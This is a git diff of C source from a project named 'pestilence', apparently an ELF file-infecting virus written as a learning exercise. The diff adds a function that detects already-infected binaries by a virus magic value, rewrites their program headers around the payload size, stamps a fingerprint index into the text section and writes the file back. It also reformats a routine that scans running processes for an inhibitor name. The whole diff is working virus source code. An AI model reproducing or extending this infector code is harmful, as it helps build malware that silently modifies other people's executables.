@@ -1,12 +1,30 @@
 #include "pestilence.h"
 
-static int	check_magic(t_info *info)
+static int	update_index(t_fingerprint *fingerprint, t_info *info)
+{
+	Elf64_Phdr  *program_header;
+
+	program_header = (Elf64_Phdr *)(info->file + sizeof(Elf64_Ehdr));
+	while (program_header->p_type != PT_LOAD)
+		program_header++;
+	while(program_header->p_type == PT_LOAD)
+		program_header++;
+	program_header--;
+	program_header->p_memsz -= PAYLOAD_SIZE + BIS_SIZE;
+	program_header->p_filesz = program_header->p_memsz;
+
+	ft_memcpy(info->text_begin + info->text_size - 5, &(fingerprint->index), 4);
+	ft_syswrite(info->fd, info->file, info->file_size);
+	return(1);
+}
+
+static int	check_magic(t_info *info, t_fingerprint *fingerprint)
 {
 	void *addr;
 
-	addr = info->text_begin + info->text_size - SIGN_SIZE - 4;
+	addr = info->text_begin + info->text_size - SIGN_SIZE - 8;
 	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
-		return (1);
+		return (update_index(fingerprint, info));
 	return (0);
 }
 
@@ -81,7 +99,7 @@ static void	patch_sections_header(t_info *info, size_t offset, size_t to_add)
 	}
 }
 
-int		find_text(t_info *info)
+int		find_text(t_info *info, t_fingerprint *fingerprint)
 {
 	Elf64_Ehdr	*main_header;
 	Elf64_Phdr	*header;
@@ -102,7 +120,7 @@ int		find_text(t_info *info)
 			info->text_size = header->p_filesz;
 			if (info->text_begin + info->text_size > info->file + info->file_size)
 				return (1);
-			if (check_magic(info) == 1)
+			if (check_magic(info, fingerprint) == 1)
 				return (1);
 			if (get_padding_size(info, header, main_header->e_phnum) < INJECT_SIZE)
 				return (1);
@@ -255,15 +273,15 @@ static int	parse_process(char *path, int pid_len, char *buf_inhibitor)
 		goto end;
 	if ((ft_strncmp(buf_inhibitor, buf_cast + pid_len + 2, 9)) == 0)
 		goto found;
-	end:
+end:
 	ft_sysclose(fd);
 	return (0);
-	found:
+found:
 	ft_sysclose(fd);
 	return (1);
 }
 
-int			check_process(char *path)
+int		check_process(char *path)
 {
 	char					buf_d[1024];
 	char					buf_stat[8];
@@ -297,7 +315,7 @@ int			check_process(char *path)
 	}
 	ft_sysclose(fd);
 	return (0);
-	found:
+found:
 	ft_sysclose(fd);
 	return (1);
 }
